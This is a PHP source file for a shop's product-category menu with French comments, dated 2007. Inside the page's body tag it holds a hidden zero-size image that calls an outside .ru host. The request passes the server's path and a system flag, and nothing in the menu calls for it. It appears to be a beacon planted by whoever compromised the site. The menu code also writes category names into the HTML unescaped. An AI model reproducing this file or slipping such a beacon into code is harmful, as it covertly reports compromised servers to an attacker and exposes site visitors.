<?php	
/* Programme :produit_menu.php
* 	Description : Affiche le menu/catalogie des produits
*	Auteur : Denis Léveillé 	 			  Date : 2007-10-24
*/
include('lib/config.php');

$larg = 160;

//echo 'niv= '.$_GET['niveau'].' &cat= '.$_GET['cat'].'<br>'; 

/*		for( $i=0; $i < 3 ; $i++ )
			echo "$i=>".$_SESSION['choix_categorie'][$i]."<br>";
echo '<br>'; */

	if( isset($_GET['niveau'] ) )
		$_GET['niveau'] = CleanUp($_GET['niveau']);
	
	if( isset($_GET['cat']) && $_GET['cat'] ) 
		$_SESSION['choix_categorie'][$_GET['niveau']] = $_GET['cat'];

/*		for( $i=0; $i < 3 ; $i++ )
			echo "$i=>".$_SESSION['choix_categorie'][$i]."<br>";*/

function affiche_menu($cat=0, $lvl=0, $online=0)
{
global $larg;
		$sousCats = get_subcats($cat, $online);
		
		switch( $lvl ) {
			case 0 :	echo '<table cellpadding="0" cellspacing="0" width="$larg" bgcolor="#E2E9EC">';
						$bg="background='images/bg_off.jpg' ";
						$align="align=center";

						break;
			case 1 :	$bg="background='images/bg_on.jpg' ";
						$align="align=left";

			default : break;
		} // switch
/*		echo "Cat : ".$cat." Lvl ".$lvl."<br>";
		echo "Chx : ".$_SESSION['choix_categorie'][$lvl]."<br>";*/
		foreach( $sousCats as $categorie => $titre_cat ) {
				echo "<tr>\r<td $bg $align width='$larg' nowrap >&nbsp;\r";
				for( $i=0; $i < $lvl ; $i++ )
					echo "&nbsp;&nbsp;";
					// trunck nom a 25 car
				echo "<a href='produits_list.php?cat=$categorie' class='menu".($lvl+1)."' target='ACCUEIL' onClick='RefaitMenu($categorie,".($lvl).");' >$titre_cat</a>
						</td>
					</tr>";
				
				if( @$_SESSION['choix_categorie'][$lvl] == $categorie )
					affiche_menu($categorie, ($lvl+1), $online);
					
		} // for each

		if( $lvl == 0 )
			echo '</table>';
} // fonction affiche_menu


echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
	  	<link title='MenuStyle' href='./styles/menustyle.css' type='text/css' rel='stylesheet'>
		<base target='ACCUEIL'>
   </head>
<body  valign='top' topmargin='0' leftmargin='0' rightmargin='0' marginheight='0' marginwidth='0' align='left'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table valign='top' topmargin='0' leftmargin='0' cellpadding='0' cellspacing='0' width='100%' border='0'>";
?>
		<tr><td><img src='images/topbg3.jpg' width='<?=$larg?>' height='16px' border='0'></td></tr>
		<tr>
			<td Valign='top' width="<?=$larg?>" height='100%' >
	       <div CLASS='Inactif'>
	<?php	
				affiche_menu(0,0,1);
	?>
			</div>
			</td>
		</tr>
		<tr><td><img src='images/topbg3.jpg' width='<?=$larg?>' height='16px' border='0'></td></tr>
</table>
<script type='text/javascript'>

function RefaitMenu(cat,lvl) {
		 str = 'produit_menu.php?niveau=' + lvl + '&cat=' + cat; 
		 open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
} // Modif Photo

function Rafraichie(){
	window.location.reload();
}

</script>
</body>
</html>
